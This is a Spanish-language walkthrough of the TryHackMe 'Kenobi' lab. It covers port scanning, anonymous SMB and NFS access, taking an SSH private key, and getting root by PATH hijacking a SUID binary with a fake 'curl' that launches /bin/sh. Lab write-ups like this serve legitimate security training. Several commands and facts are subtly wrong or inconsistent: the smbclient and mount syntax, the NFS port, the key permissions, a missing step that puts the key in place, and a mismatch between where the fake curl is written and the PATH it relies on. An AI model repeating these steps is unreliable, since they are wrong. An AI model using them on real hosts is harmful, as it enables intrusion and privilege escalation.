---
title: "Kenobi — TryHackMe"
description: "Writeup paso a paso de la máquina Kenobi de TryHackMe, desde el reconocimiento inicial hasta la escalada de privilegios."
date: "2026-05-24"
published: true
tags: ["tryhackme", "linux", "enumeracion", "smb", "nfs", "privilege-escalation", "pentesting"]
readTime: "18 min"
---

# 🔥 TryHackMe — Kenobi

La máquina **Kenobi** es una buena introducción a la enumeración de servicios Linux, SMB, NFS y escalada de privilegios a través de **path hijacking** y **SUID**. En este post te dejo un writeup ordenado y reproducible para que puedas seguir la ruta de explotación sin perderte.

---

## 1) Preparación del entorno

Lo primero es agregar la IP de la máquina a nuestro `/etc/hosts` para tener un nombre amigable.

```bash
sudo nano /etc/hosts
```

Agrega una entrada similar a esta:

```bash
<IP_KENOBI>  kenobi.thm
```

Luego iniciamos el reconocimiento con un escaneo de puertos agresivo.

```bash
nmap -sCV -Pn -T5 --min-rate 9500 <IP>
```

Para esta máquina normalmente aparecen servicios como **SMB**, **FTP**, **NFS** y **SSH**.

---

## 2) Enumeración SMB

Enumeramos los shares y usuarios de SMB.

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

Probamos el acceso anónimo a SMB.

```bash
smbclient //<IP>/anonymous
```

Si el share acepta anónimo, podemos listar archivos o descargar información interesante.

```bash
wget log.txt
```

También podemos hacer una copia recursiva del share.

```bash
smbget -R smb://<IP>/anonymous
```

Esto suele revelar archivos de ayuda o información útil para la siguiente fase.

---

## 3) Enumeración NFS

La máquina también expone NFS en el puerto 111. Podemos enumerar el exportado con scripts de Nmap.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

Después montamos el exportado `/var` para revisar si hay archivos sensibles.

```bash
mkdir /mnt/kenobiNFS
mount <IP>/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

Si encontramos un directorio temporal con un `id_rsa`, lo podemos copiar.

```bash
cp /mnt/kenobiNFS/tmp/id_rsa ./id_rsa
chmod +x id_rsa
```

---

## 4) Acceso por SSH

Con la clave privada obtenida, intentamos autenticarnos como `kenobi`.

```bash
ssh -i id_rsa kenobi@<IP>
```

Una vez dentro, leemos la bandera de usuario.

```bash
cat /home/kenobi/user.txt
```

---

## 5) Reconocimiento post-explotación

Nos movemos al análisis del sistema en busca de binaries con permisos SUID.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Esto suele mostrar herramientas que pueden ser abusadas para escalar privilegios.

También comprobamos servicios y el kernel.

```bash
curl -I localhost
uname -r
ifconfig
```

> En el writeup original también se utiliza `ifconfig`, así que es recomendable usar esa herramienta si está instalada en la máquina.

---

## 6) Escalada de privilegios

La explotación en Kenobi suele pasar por abusar del binary `/usr/bin/menu` o de la variable `PATH`.

Primero verificamos qué ejecuta el binario. Si no hay una ruta segura, podemos preparar un payload malicioso en `curl`.

```bash
echo /bin/sh > curl
chmod +x curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Si el binario invoca `curl` sin ruta absoluta, el shell malicioso será ejecutado con privilegios de root.

Una vez dentro del shell privilegiado, leemos la bandera final.

```bash
cat /root/root.txt
```

---

## 7) Resumen de la ruta de ataque

1. Escaneo inicial con `nmap`.
2. Enumeración SMB y acceso anónimo.
3. Descarga de información sensible y/o exploración recursiva de shares.
4. Enumeración NFS y montaje del exportado.
5. Obtención de `id_rsa` y acceso vía SSH.
6. Búsqueda de SUID y abuso de `PATH`/`/usr/bin/menu`.
7. Lectura de `/root/root.txt`.

---

## 8) Comandos clave usados

```bash
sudo nano /etc/hosts
nmap -sCV -Pn -T5 --min-rate 9500 <IP>
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
smbclient //<IP>/anonymous
wget log.txt
smbget -R smb://<IP>/anonymous
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
mkdir /mnt/kenobiNFS
mount <IP>/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa ./id_rsa
chmod +x id_rsa
ssh -i id_rsa kenobi@<IP>
cat /home/kenobi/user.txt
find / -perm -u=s -type f 2>/dev/null
curl -I localhost
uname -r
ifconfig
echo /bin/sh > curl
chmod +x curl
export PATH=/tmp:$PATH
/usr/bin/menu
cat /root/root.txt
```

---

## 9) Lecciones aprendidas

- **SMB anónimo** puede revelar información útil incluso si no se tiene acceso completo.
- **NFS montado sin restricciones** puede exponer archivos sensibles como claves privadas.
- **SUID binaries** y **PATH hijacking** siguen siendo vectores clásicos de escalada de privilegios.
- Siempre conviene revisar el contenido de `/tmp`, `/var/tmp` y archivos auxiliares que puedan ser abusados por un usuario con permisos de ejecución.

Si quieres, en el próximo post puedo hacer una versión **más técnica y detallada** de la escalada específica de `menu` o una **tabla de servicios y evidencias** por cada paso. 
